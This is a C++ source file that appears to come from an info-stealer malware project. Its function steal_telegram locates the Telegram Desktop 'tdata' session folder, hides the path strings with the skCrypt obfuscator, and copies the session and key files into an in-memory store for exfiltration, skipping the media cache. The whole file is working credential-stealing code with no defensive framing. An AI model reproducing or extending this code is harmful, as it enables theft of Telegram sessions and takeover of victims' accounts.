#include <misc_stealing/telegram.hpp>
#include <filesystem>
#include <sysinfo.hpp>
#include <exfiltration_utils/mem_store.hpp>
#include <crypto_utils/skCrypter.hpp>

namespace fs = std::filesystem;

namespace misc_exfiltration {

    void steal_telegram() {
        fs::path tdata = fs::path(features::get_home()) / skCrypt("AppData") / skCrypt("Roaming") / skCrypt("Telegram Desktop") / skCrypt("tdata");
        if (!fs::exists(tdata)) return;

        //skip media cache. session/key files are small
        mem_store::import_tree(skCrypt("telegram/tdata"), tdata, 5 * 1024 * 1024);
    }
}
